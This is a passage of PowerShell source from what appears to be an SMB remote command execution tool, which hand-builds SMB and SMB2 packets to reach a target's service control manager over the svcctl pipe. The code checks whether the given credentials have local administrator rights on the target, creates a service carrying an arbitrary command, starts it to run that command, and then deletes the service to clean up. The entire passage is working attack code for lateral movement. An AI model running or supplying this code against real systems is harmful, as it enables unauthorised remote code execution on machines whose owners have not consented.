                            $SMB_signing_counter = $SMB_signing_counter + 2

                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signing_sequence

                        }



                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   

                        $packet_SMB_data = Get-PacketSMBCloseRequest 0x00,0x40

                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service



                        if($SMB_signing)

                        {

                            $SMB_sign = $session_key + $SMB_header + $SMB_data 

                            $SMB_signature = $MD5.ComputeHash($SMB_sign)

                            $SMB_signature = $SMB_signature[0..7]

                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signature

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        }



                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                        $SMB_client_stream.Flush()

                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        $SMB_client_stage = 'TreeDisconnect'

                    }



                    'TreeDisconnect'

                    {

                        $packet_SMB_header = Get-PacketSMBHeader 0x71 0x18 0x07,0xc8 $SMB_tree_ID $process_ID_bytes $SMB_user_ID



                        if($SMB_signing)

                        {

                            $packet_SMB_header["SMBHeader_Flags2"] = 0x05,0x48

                            $SMB_signing_counter = $SMB_signing_counter + 2

                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signing_sequence

                        }



                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   

                        $packet_SMB_data = Get-PacketSMBTreeDisconnectRequest

                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service



                        if($SMB_signing)

                        {

                            $SMB_sign = $session_key + $SMB_header + $SMB_data 

                            $SMB_signature = $MD5.ComputeHash($SMB_sign)

                            $SMB_signature = $SMB_signature[0..7]

                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signature

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        }



                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                        $SMB_client_stream.Flush()

                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        $SMB_client_stage = 'Logoff'

                    }



                    'Logoff'

                    {

                        $packet_SMB_header = Get-PacketSMBHeader 0x74 0x18 0x07,0xc8 0x34,0xfe $process_ID_bytes $SMB_user_ID



                        if($SMB_signing)

                        {

                            $packet_SMB_header["SMBHeader_Flags2"] = 0x05,0x48

                            $SMB_signing_counter = $SMB_signing_counter + 2 

                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signing_sequence

                        }



                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   

                        $packet_SMB_data = Get-PacketSMBLogoffAndXRequest

                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service



                        if($SMB_signing)

                        {

                            $SMB_sign = $session_key + $SMB_header + $SMB_data 

                            $SMB_signature = $MD5.ComputeHash($SMB_sign)

                            $SMB_signature = $SMB_signature[0..7]

                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signature

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        }



                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                        $SMB_client_stream.Flush()

                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        $SMB_client_stage = 'Exit'

                    }



                }

            

                if($SMBExec_failed)

                {

                    BREAK SMB_execute_loop

                }

            

            }



        }  

        else

        {

            

            $SMB_client_stage = 'TreeConnect'



            :SMB_execute_loop while ($SMB_client_stage -ne 'exit')

            {



                switch ($SMB_client_stage)

                {

            

                    'TreeConnect'

                    {

                        $SMB2_message_ID++

                        $packet_SMB2_header = Get-PacketSMB2Header 0x03,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID

                        $packet_SMB2_header["SMB2Header_CreditRequest"] = 0x7f,0x00



                        if($SMB_signing)

                        {

                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      

                        }



                        $packet_SMB2_data = Get-PacketSMB2TreeConnectRequest $SMB_path_bytes

                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    

                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service



                        if($SMB_signing)

                        {

                            $SMB2_sign = $SMB2_header + $SMB2_data 

                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                            $SMB2_signature = $SMB2_signature[0..15]

                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        }



                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                        $SMB_client_stream.Flush()

                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        $SMB_client_stage = 'CreateRequest'

                    }

                  

                    'CreateRequest'

                    {

                        $SMB2_tree_ID = 0x01,0x00,0x00,0x00

                        $SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \svcctl

                        $SMB2_message_ID++

                        $packet_SMB2_header = Get-PacketSMB2Header 0x05,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID

                        $packet_SMB2_header["SMB2Header_CreditRequest"] = 0x7f,0x00

                    

                        if($SMB_signing)

                        {

                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      

                        }



                        $packet_SMB2_data = Get-PacketSMB2CreateRequestFile $SMB_named_pipe_bytes

                        $packet_SMB2_data["SMB2CreateRequestFile_Share_Access"] = 0x07,0x00,0x00,0x00  

                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data  

                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service



                        if($SMB_signing)

                        {

                            $SMB2_sign = $SMB2_header + $SMB2_data  

                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                            $SMB2_signature = $SMB2_signature[0..15]

                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        }



                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                        $SMB_client_stream.Flush()

                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        $SMB_client_stage = 'RPCBind'

                    }

                

                    'RPCBind'

                    {

                        $SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \svcctl

                        $SMB_file_ID = $SMB_client_receive[132..147]

                        $SMB2_message_ID++

                        $packet_SMB2_header = Get-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID

                        $packet_SMB2_header["SMB2Header_CreditRequest"] = 0x7f,0x00

                    

                        if($SMB_signing)

                        {

                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      

                        }



                        $packet_RPC_data = Get-PacketRPCBind 1 0xb8,0x10 0x01 0x00,0x00 $SMB_named_pipe_UUID 0x02,0x00

                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data

                        $packet_SMB2_data = Get-PacketSMB2WriteRequest $SMB_file_ID $RPC_data.Length

                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 

                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length

                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service



                        if($SMB_signing)

                        {

                            $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data

                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                            $SMB2_signature = $SMB2_signature[0..15]

                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        }



                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data

                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                        $SMB_client_stream.Flush()

                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        $SMB_client_stage = 'ReadRequest'

                        $SMB_client_stage_next = 'OpenSCManagerW'

                    }

               

                    'ReadRequest'

                    {



                        Start-Sleep -m $Sleep

                        $SMB2_message_ID++

                        $packet_SMB2_header = Get-PacketSMB2Header 0x08,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID

                        $packet_SMB2_header["SMB2Header_CreditRequest"] = 0x7f,0x00

                        $packet_SMB2_header["SMB2Header_CreditCharge"] = 0x10,0x00

                    

                        if($SMB_signing)

                        {

                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      

                        }



                        $packet_SMB2_data = Get-PacketSMB2ReadRequest $SMB_file_ID

                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 

                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service



                        if($SMB_signing)

                        {

                            $SMB2_sign = $SMB2_header + $SMB2_data 

                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                            $SMB2_signature = $SMB2_signature[0..15]

                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        }



                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data 

                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                        $SMB_client_stream.Flush()

                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null



                        if([System.BitConverter]::ToString($SMB_client_receive[12..15]) -ne '03-01-00-00')

                        {

                            $SMB_client_stage = $SMB_client_stage_next

                        }

                        else

                        {

                            $SMB_client_stage = 'StatusPending'

                        }



                    }



                    'StatusPending'

                    {

                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null



                        if([System.BitConverter]::ToString($SMB_client_receive[12..15]) -ne '03-01-00-00')

                        {

                            $SMB_client_stage = $SMB_client_stage_next

                        }



                    }

                

                    'OpenSCManagerW'

                    {

                        $SMB2_message_ID = 30

                        $packet_SMB2_header = Get-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID

                        $packet_SMB2_header["SMB2Header_CreditRequest"] = 0x7f,0x00

                    

                        if($SMB_signing)

                        {

                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      

                        }



                        $packet_SCM_data = Get-PacketSCMOpenSCManagerW $SMB_service_bytes $SMB_service_length

                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data

                        $packet_RPC_data = Get-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0f,0x00

                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 

                        $packet_SMB2_data = Get-PacketSMB2WriteRequest $SMB_file_ID ($RPC_data.Length + $SCM_data.Length)

                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 

                        $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length

                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service



                        if($SMB_signing)

                        {

                            $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data

                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                            $SMB2_signature = $SMB2_signature[0..15]

                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        }



                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data

                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                        $SMB_client_stream.Flush()

                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        $SMB_client_stage = 'ReadRequest'

                        $SMB_client_stage_next = 'CheckAccess'        

                    }



                    'CheckAccess'

                    {



                        if([System.BitConverter]::ToString($SMB_client_receive[128..131]) -eq '00-00-00-00' -and [System.BitConverter]::ToString($SMB_client_receive[108..127]) -ne '00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00')

                        {



                            $SMB_service_manager_context_handle = $SMB_client_receive[108..127]

                            

                            if($SMB_execute -eq $true)

                            {

                                Write-Verbose "$output_username is a local administrator on $Target"

                                $packet_SCM_data = Get-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $SMBExec_command_bytes $SMBExec_command_length_bytes

                                $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data



                                if($SCM_data.Length -lt $SMB_split_index)

                                {

                                    $SMB_client_stage = 'CreateServiceW'

                                }

                                else

                                {

                                    $SMB_client_stage = 'CreateServiceW_First'

                                }



                            }

                            else

                            {

                                Write-Output "$output_username is a local administrator on $Target"

                                $SMB2_message_ID += 20

                                $SMB_close_service_handle_stage = 2

                                $SMB_client_stage = 'CloseServiceHandle'

                            }



                        }

                        elseif([System.BitConverter]::ToString($SMB_client_receive[128..131]) -eq '05-00-00-00')

                        {

                            Write-Output "$output_username is not a local administrator or does not have required privilege on $Target"

                            $SMBExec_failed = $true

                        }

                        else

                        {

                            Write-Output "Something went wrong with $Target"

                            $SMBExec_failed = $true

                        }



                    }

                

                    'CreateServiceW'

                    {

                        

                        if($SMBExec_command_bytes.Length -lt $SMB_split_index)

                        {

                            $SMB2_message_ID += 20

                            $packet_SMB2_header = Get-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID

                            $packet_SMB2_header["SMB2Header_CreditRequest"] = 0x7f,0x00

                        

                            if($SMB_signing)

                            {

                                $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      

                            }



                            $packet_RPC_data = Get-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00

                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data

                            $packet_SMB2_data = Get-PacketSMB2WriteRequest $SMB_file_ID ($RPC_data.Length + $SCM_data.Length)

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data

                            $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length

                            $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length

                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service



                            if($SMB_signing)

                            {

                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data

                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                                $SMB2_signature = $SMB2_signature[0..15]

                                $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature

                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            }



                            $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data

                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                            $SMB_client_stream.Flush()

                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                            $SMB_client_stage = 'ReadRequest'

                            $SMB_client_stage_next = 'StartServiceW'

                        }

                        else

                        {

                            

                            

                        }

                    }



                    'CreateServiceW_First'

                    {

                        $SMB_split_stage_final = [Math]::Ceiling($SCM_data.Length / $SMB_split_index)

                        $SMB2_message_ID += 20

                        $packet_SMB2_header = Get-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID

                        $packet_SMB2_header["SMB2Header_CreditRequest"] = 0x7f,0x00

                        

                        if($SMB_signing)

                        {

                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      

                        }



                        $SCM_data_first = $SCM_data[0..($SMB_split_index - 1)]

                        $packet_RPC_data = Get-PacketRPCRequest 0x01 0 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_first

                        $packet_RPC_data["RPCRequest_AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length)

                        $SMB_split_index_tracker = $SMB_split_index

                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 

                        $packet_SMB2_data = Get-PacketSMB2WriteRequest $SMB_file_ID $RPC_data.Length

                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 

                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length

                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service



                        if($SMB_signing)

                        {

                            $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data

                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                            $SMB2_signature = $SMB2_signature[0..15]

                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        }



                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data

                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                        $SMB_client_stream.Flush()

                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null



                        if($SMB_split_stage_final -le 2)

                        {

                            $SMB_client_stage = 'CreateServiceW_Last'

                        }

                        else

                        {

                            $SMB_split_stage = 2

                            $SMB_client_stage = 'CreateServiceW_Middle'

                        }



                    }



                    'CreateServiceW_Middle'

                    {

                        $SMB_split_stage++

                        $SMB2_message_ID++

                        $packet_SMB2_header = Get-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID

                        $packet_SMB2_header["SMB2Header_CreditRequest"] = 0x7f,0x00

                        

                        if($SMB_signing)

                        {

                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      

                        }



                        $SCM_data_middle = $SCM_data[$SMB_split_index_tracker..($SMB_split_index_tracker + $SMB_split_index - 1)]

                        $SMB_split_index_tracker += $SMB_split_index

                        $packet_RPC_data = Get-PacketRPCRequest 0x00 0 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_middle

                        $packet_RPC_data["RPCRequest_AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length - $SMB_split_index_tracker + $SMB_split_index)

                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data

                        $packet_SMB2_data = Get-PacketSMB2WriteRequest $SMB_file_ID $RPC_data.Length

                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    

                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length

                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service



                        if($SMB_signing)

                        {

                            $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data

                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                            $SMB2_signature = $SMB2_signature[0..15]

                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        }



                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data

                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                        $SMB_client_stream.Flush()

                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null



                        if($SMB_split_stage -ge $SMB_split_stage_final)

                        {

                            $SMB_client_stage = 'CreateServiceW_Last'

                        }

                        else

                        {

                            $SMB_client_stage = 'CreateServiceW_Middle'

                        }



                    }



                    'CreateServiceW_Last'

                    {

                        $SMB2_message_ID++

                        $packet_SMB2_header = Get-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID

                        $packet_SMB2_header["SMB2Header_CreditRequest"] = 0x7f,0x00

                        

                        if($SMB_signing)

                        {

                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      

                        }



                        $SCM_data_last = $SCM_data[$SMB_split_index_tracker..$SCM_data.Length]

                        $packet_RPC_data = Get-PacketRPCRequest 0x02 0 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_last

                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data

                        $packet_SMB2_data = Get-PacketSMB2WriteRequest $SMB_file_ID $RPC_data.Length

                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    

                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length

                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service



                        if($SMB_signing)

                        {

                            $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data

                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                            $SMB2_signature = $SMB2_signature[0..15]

                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        }



                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data

                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                        $SMB_client_stream.Flush()

                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        $SMB_client_stage = 'ReadRequest'

                        $SMB_client_stage_next = 'StartServiceW'

                    }



                    'StartServiceW'

                    {

                    

                        if([System.BitConverter]::ToString($SMB_client_receive[132..135]) -eq '00-00-00-00')

                        {

                            Write-Verbose "Service $SMB_service created on $Target"

                            $SMB_service_context_handle = $SMB_client_receive[112..131]

                            $SMB2_message_ID += 20

                            $packet_SMB2_header = Get-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID

                            $packet_SMB2_header["SMB2Header_CreditRequest"] = 0x7f,0x00

                        

                            if($SMB_signing)

                            {

                                $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      

                            }



                            $packet_SCM_data = Get-PacketSCMStartServiceW $SMB_service_context_handle

                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data

                            $packet_RPC_data = Get-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x13,0x00

                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data

                            $packet_SMB2_data = Get-PacketSMB2WriteRequest $SMB_file_ID ($RPC_data.Length + $SCM_data.Length)

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data   

                            $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length

                            $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length

                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service



                            if($SMB_signing)

                            {

                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data

                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                                $SMB2_signature = $SMB2_signature[0..15]

                                $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature

                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            }



                            $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data

                            Write-Verbose "Trying to execute command on $Target"

                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                            $SMB_client_stream.Flush()

                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                            $SMB_client_stage = 'ReadRequest'

                            $SMB_client_stage_next = 'DeleteServiceW'     

                        }

                        elseif([System.BitConverter]::ToString($SMB_client_receive[132..135]) -eq '31-04-00-00')

                        {

                            Write-Output "Service $SMB_service creation failed on $Target"

                            $SMBExec_failed = $true

                        }

                        else

                        {

                            Write-Output "Service creation fault context mismatch"

                            $SMBExec_failed = $true

                        }

 

                    }

                

                    'DeleteServiceW'

                    { 



                        if([System.BitConverter]::ToString($SMB_client_receive[108..111]) -eq '1d-04-00-00')

                        {

                            Write-Output "Command executed with service $SMB_service on $Target"

                        }

                        elseif([System.BitConverter]::ToString($SMB_client_receive[108..111]) -eq '02-00-00-00')

                        {

                            Write-Output "Service $SMB_service failed to start on $Target"

                        }



                        $SMB2_message_ID += 20

                        $packet_SMB2_header = Get-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID

                        $packet_SMB2_header["SMB2Header_CreditRequest"] = 0x7f,0x00

                        

                        if($SMB_signing)

                        {

                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00

                        }



                        $packet_SCM_data = Get-PacketSCMDeleteServiceW $SMB_service_context_handle

                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data

                        $packet_RPC_data = Get-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x02,0x00

                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 

                        $packet_SMB2_data = Get-PacketSMB2WriteRequest $SMB_file_ID ($RPC_data.Length + $SCM_data.Length)

                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 

                        $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length

                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service



                        if($SMB_signing)

                        {

                            $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data

                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                            $SMB2_signature = $SMB2_signature[0..15]

                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        }



                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data

